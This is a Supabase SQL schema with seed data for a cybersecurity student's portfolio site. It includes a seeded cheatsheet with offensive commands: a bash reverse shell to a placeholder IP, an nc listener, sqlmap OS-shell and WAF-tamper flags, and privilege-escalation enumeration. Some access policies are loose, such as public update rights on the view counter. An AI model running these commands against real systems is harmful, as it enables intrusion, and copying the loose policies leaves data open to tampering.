-- ============================================================
-- 0xIdiot Portfolio — FIXED Schema
-- Supabase > SQL Editor > New Query > paste all > Run
-- ============================================================

create extension if not exists "uuid-ossp";

-- ============================================================
-- TABLES
-- ============================================================

create table if not exists profile (
  id uuid primary key default uuid_generate_v4(),
  name text not null default 'Abhishek N',
  alias text not null default '0xIdiot',
  tagline text not null default 'Cybersecurity Engineer & Full-Stack Developer',
  bio text not null default '',
  location text not null default 'Bangalore, Karnataka, IN',
  avatar_url text,
  resume_url text,
  bmc_username text default 'YOUR_BMC_USERNAME',
  updated_at timestamptz default now()
);

create table if not exists stats (
  id uuid primary key default uuid_generate_v4(),
  label text not null,
  value text not null,
  sub text,
  icon text,
  sort_order int default 0
);

create table if not exists projects (
  id uuid primary key default uuid_generate_v4(),
  name text not null,
  description text not null,
  status text not null default 'shipped',
  stack text[] default '{}',
  demo_url text,
  github_url text,
  image_url text,
  featured boolean default false,
  sort_order int default 0,
  created_at timestamptz default now()
);

create table if not exists timeline (
  id uuid primary key default uuid_generate_v4(),
  date_label text not null,
  title text not null,
  body text not null,
  tags text[] default '{}',
  highlight boolean default false,
  sort_order int default 0
);

create table if not exists writeups (
  id uuid primary key default uuid_generate_v4(),
  title text not null,
  platform text not null,
  difficulty text not null default 'easy',
  content text,
  external_url text,
  machine_os text,
  tags text[] default '{}',
  published boolean default false,
  created_at timestamptz default now()
);

create table if not exists cheatsheets (
  id uuid primary key default uuid_generate_v4(),
  title text not null,
  category text not null default 'General',
  entries jsonb not null default '[]',
  sort_order int default 0
);

create table if not exists badges (
  id uuid primary key default uuid_generate_v4(),
  label text not null,
  hot boolean default false,
  sort_order int default 0
);

create table if not exists contact_links (
  id uuid primary key default uuid_generate_v4(),
  label text not null,
  value text not null,
  url text not null,
  icon text not null default '@',
  sort_order int default 0
);

create table if not exists messages (
  id uuid primary key default uuid_generate_v4(),
  name text not null,
  email text not null,
  subject text,
  message text not null,
  read boolean default false,
  created_at timestamptz default now()
);

create table if not exists views (
  id int primary key default 1,
  count bigint default 0
);
insert into views (id, count) values (1, 0) on conflict do nothing;

-- ============================================================
-- ROW LEVEL SECURITY
-- ============================================================

alter table profile enable row level security;
alter table stats enable row level security;
alter table projects enable row level security;
alter table timeline enable row level security;
alter table writeups enable row level security;
alter table cheatsheets enable row level security;
alter table badges enable row level security;
alter table contact_links enable row level security;
alter table messages enable row level security;
alter table views enable row level security;

-- PUBLIC READ
create policy "Public read profile" on profile for select using (true);
create policy "Public read stats" on stats for select using (true);
create policy "Public read projects" on projects for select using (true);
create policy "Public read timeline" on timeline for select using (true);
create policy "Public read writeups" on writeups for select using (published = true);
create policy "Public read cheatsheets" on cheatsheets for select using (true);
create policy "Public read badges" on badges for select using (true);
create policy "Public read contact_links" on contact_links for select using (true);
create policy "Public read views" on views for select using (true);
create policy "Public update views" on views for update using (true);
create policy "Public insert messages" on messages for insert with check (true);

-- ADMIN WRITE (any authenticated user = only you since only you have login)
create policy "Admin write profile" on profile for all using (auth.role() = 'authenticated');
create policy "Admin write stats" on stats for all using (auth.role() = 'authenticated');
create policy "Admin write projects" on projects for all using (auth.role() = 'authenticated');
create policy "Admin write timeline" on timeline for all using (auth.role() = 'authenticated');
create policy "Admin write writeups" on writeups for all using (auth.role() = 'authenticated');
create policy "Admin write cheatsheets" on cheatsheets for all using (auth.role() = 'authenticated');
create policy "Admin write badges" on badges for all using (auth.role() = 'authenticated');
create policy "Admin write contact_links" on contact_links for all using (auth.role() = 'authenticated');
create policy "Admin write messages" on messages for all using (auth.role() = 'authenticated');

-- ============================================================
-- STORAGE BUCKET
-- ============================================================

insert into storage.buckets (id, name, public)
values ('portfolio', 'portfolio', true)
on conflict (id) do nothing;

drop policy if exists "Public read portfolio storage" on storage.objects;
drop policy if exists "Admin write portfolio storage" on storage.objects;
drop policy if exists "Admin update portfolio storage" on storage.objects;
drop policy if exists "Admin delete portfolio storage" on storage.objects;

create policy "Public read portfolio storage"
  on storage.objects for select
  using (bucket_id = 'portfolio');

create policy "Admin write portfolio storage"
  on storage.objects for insert
  with check (bucket_id = 'portfolio' and auth.role() = 'authenticated');

create policy "Admin update portfolio storage"
  on storage.objects for update
  using (bucket_id = 'portfolio' and auth.role() = 'authenticated');

create policy "Admin delete portfolio storage"
  on storage.objects for delete
  using (bucket_id = 'portfolio' and auth.role() = 'authenticated');

-- ============================================================
-- RPC
-- ============================================================

create or replace function increment_views()
returns void
language sql
security definer
as $$
  update views set count = count + 1 where id = 1;
$$;

-- ============================================================
-- SEED DATA
-- ============================================================

insert into profile (name, alias, tagline, bio, location, bmc_username)
select
  'Abhishek N', '0xIdiot',
  'Cybersecurity Engineer & Full-Stack Developer',
  'Security engineer building real-world offensive security tooling. Creator of XCloak — an AI-powered cybersecurity SaaS. Top 1% on TryHackMe globally. PortSwigger Practitioner. Pursuing MCA in Cybersecurity at S-VYASA University, Bangalore.',
  'Bangalore, Karnataka, IN',
  'YOUR_BMC_USERNAME'
where not exists (select 1 from profile);

insert into stats (label, value, sub, sort_order)
select * from (values
  ('TryHackMe Global Rank', '#3515', 'Top 1% worldwide', 1),
  ('Rooms Completed', '413', 'TryHackMe', 2),
  ('picoCTF Challenges', '95', 'Easy tier cleared', 3),
  ('PortSwigger Labs', '46+', 'Practitioner level', 4),
  ('Academic CGPA', '9.8', 'Sem 2 — MCA Cybersecurity', 5),
  ('Docker Tools Orchestrated', '7', 'ESO pentest pipeline', 6)
) as v(label, value, sub, sort_order)
where not exists (select 1 from stats);

insert into badges (label, hot, sort_order)
select * from (values
  ('THM Top 1%', true, 1),
  ('PortSwigger Practitioner', true, 2),
  ('picoCTF Solver', false, 3),
  ('VAPT', false, 4),
  ('Web App Security', false, 5),
  ('Digital Forensics', false, 6),
  ('CTF Player', false, 7),
  ('SaaS Builder', false, 8)
) as v(label, hot, sort_order)
where not exists (select 1 from badges);

insert into projects (name, description, status, stack, demo_url, github_url, featured, sort_order)
select * from (values
  ('XCloak / ESO', 'AI-powered cybersecurity SaaS. Users describe a scan goal in plain English, AI plans and executes end-to-end. 7 Docker-isolated tools, real-time WebSocket streaming, PDF pentest report export. Paid at Rs.999/month.', 'live', ARRAY['Next.js 15','FastAPI','Supabase','Docker','Redis','RabbitMQ','PostgreSQL','Nmap','Nuclei'], 'https://xcloak.tech', 'https://github.com/The-Abhishek1/Xcl0ak-New', true, 1),
  ('ForenX', 'Linux digital forensics CLI toolkit for incident response. Analyzes auth.log, memory dumps, PCAP captures, and file artifacts.', 'open-source', ARRAY['Python 3','Scapy','Volatility','ExifTool'], null, 'https://github.com/The-Abhishek1/ForenX', false, 2),
  ('AI Student Placement System', 'AI-driven student-company matching platform using Google Gemini and OpenAI. Secure auth with bcrypt + JWT + TOTP 2FA.', 'shipped', ARRAY['Next.js 14','MongoDB','Socket.io','Gemini API','OpenAI'], null, 'https://github.com/The-Abhishek1/AI-Student-Placement-System', false, 3),
  ('CRMSX', 'Real-time CRM with live data updates, user management, and status tracking.', 'shipped', ARRAY['React.js','Node.js','Express.js','MySQL'], null, 'https://github.com/The-Abhishek1/CRMSX', false, 4),
  ('PropertyNexus', 'Full CRUD property listing platform with status workflow, price history, and analytics.', 'shipped', ARRAY['Next.js 14','Firebase','Tailwind CSS','Recharts'], null, 'https://github.com/The-Abhishek1/Property-Manager', false, 5),
  ('Aethr', 'Next.js/TypeScript social platform with Discord-inspired layout and reputation economy.', 'wip', ARRAY['Next.js','TypeScript','Supabase'], null, 'https://github.com/The-Abhishek1', false, 6)
) as v(name, description, status, stack, demo_url, github_url, featured, sort_order)
where not exists (select 1 from projects);

insert into timeline (date_label, title, body, tags, highlight, sort_order)
select * from (values
  ('2025 — Present', 'XCloak goes live as paid SaaS', 'Launched XCloak at xcloak.tech with Razorpay billing. ESO backend orchestrates 7 Docker tools with AI planning and real-time WebSocket streaming.', ARRAY['Milestone','FastAPI','Next.js 15'], true, 1),
  ('Apr 2025', 'Jr. Penetration Tester Path — TryHackMe', 'Completed the full Jr. Penetration Tester learning path. Reached global rank #3515, top 1% worldwide with 413 rooms completed.', ARRAY['Certification','TryHackMe'], true, 2),
  ('2024 — 2025', 'MCA in Cybersecurity @ S-VYASA University', 'Pursuing MCA specializing in Cybersecurity, Ethical Hacking & Cyber Forensics. CGPA: 9.0 > 9.8 > 9.4.', ARRAY['Education','CGPA 9.8'], false, 3),
  ('2024', 'ForenX — Open Source Forensics Toolkit', 'Built and open-sourced ForenX, a modular Linux digital forensics CLI for incident response.', ARRAY['Open Source','Python','Forensics'], false, 4),
  ('2023 — 2024', 'EC-Council & Cisco Certifications', 'Completed Android Bug Bounty, SQL Injection Attacks, Dark Web (EC-Council). Cisco: Endpoint Security, Networking Basics.', ARRAY['Certifications','EC-Council','Cisco'], false, 5),
  ('2021 — 2024', 'BCA @ Surana College — CGPA 8.64', 'Bachelor of Computer Applications. Started journey into ethical hacking and CTFs.', ARRAY['Education','BCA'], false, 6),
  ('Target', 'CEH then OSCP', 'CEH for corporate HR recognition. OSCP for elite offensive security. Goal: international cybersecurity role.', ARRAY['Next','OSCP','CEH'], true, 7)
) as v(date_label, title, body, tags, highlight, sort_order)
where not exists (select 1 from timeline);

insert into cheatsheets (title, category, entries, sort_order)
select * from (values
  ('Nmap Quick Ref', 'Recon', '[{"label":"Full port scan","cmd":"nmap -p- -T4 <ip>"},{"label":"Service + version","cmd":"-sV -sC"},{"label":"UDP scan","cmd":"-sU --top-ports 100"},{"label":"OS detection","cmd":"-O --osscan-guess"},{"label":"Output all formats","cmd":"-oA scan"},{"label":"Vuln scripts","cmd":"--script vuln"}]'::jsonb, 1),
  ('Gobuster / FFuF', 'Enumeration', '[{"label":"Dir brute","cmd":"gobuster dir -u URL -w wl"},{"label":"DNS brute","cmd":"gobuster dns -d domain"},{"label":"Vhost fuzz","cmd":"ffuf -H Host:FUZZ"},{"label":"Filter size","cmd":"ffuf -fs <size>"},{"label":"POST fuzz","cmd":"ffuf -d user=FUZZ"}]'::jsonb, 2),
  ('SQLMap', 'Exploitation', '[{"label":"Basic scan","cmd":"sqlmap -u URL?id=1"},{"label":"With cookie","cmd":"--cookie=sess=abc"},{"label":"Dump DB","cmd":"--dump -D dbname"},{"label":"OS shell","cmd":"--os-shell"},{"label":"Tamper WAF","cmd":"--tamper=space2comment"}]'::jsonb, 3),
  ('Linux PrivEsc', 'Post-Exploitation', '[{"label":"SUID bins","cmd":"find / -perm -4000"},{"label":"Sudo list","cmd":"sudo -l"},{"label":"Cron jobs","cmd":"cat /etc/crontab"},{"label":"Writable paths","cmd":"find / -writable 2>/dev/null"},{"label":"GTFOBins","cmd":"gtfobins.github.io"}]'::jsonb, 4),
  ('Reverse Shells', 'Exploitation', '[{"label":"Bash","cmd":"bash -i >& /dev/tcp/IP/PORT 0>&1"},{"label":"nc listener","cmd":"nc -lvnp 4444"},{"label":"Upgrade TTY","cmd":"python3 -c import pty;pty.spawn(bash)"},{"label":"RevShells","cmd":"revshells.com"}]'::jsonb, 5),
  ('Burp Suite', 'Web App', '[{"label":"Intercept toggle","cmd":"Ctrl+T"},{"label":"Send to Repeater","cmd":"Ctrl+R"},{"label":"Send to Intruder","cmd":"Ctrl+I"},{"label":"Active scan","cmd":"Right-click Scan"},{"label":"Match Replace","cmd":"Proxy Options"}]'::jsonb, 6)
) as v(title, category, entries, sort_order)
where not exists (select 1 from cheatsheets);

insert into contact_links (label, value, url, icon, sort_order)
select * from (values
  ('Email', 'abhishekn1003@gmail.com', 'mailto:abhishekn1003@gmail.com', '@', 1),
  ('GitHub', 'github.com/The-Abhishek1', 'https://github.com/The-Abhishek1', 'GH', 2),
  ('LinkedIn', 'linkedin.com/in/abhishek-gowda17', 'https://linkedin.com/in/abhishek-gowda17', 'in', 3),
  ('TryHackMe', 'tryhackme.com/p/0xIdiot', 'https://tryhackme.com/p/0xIdiot', 'THM', 4),
  ('XCloak SaaS', 'xcloak.tech', 'https://xcloak.tech', 'X', 5),
  ('Phone', '+91 6366652685', 'tel:+916366652685', '#', 6)
) as v(label, value, url, icon, sort_order)
where not exists (select 1 from contact_links);
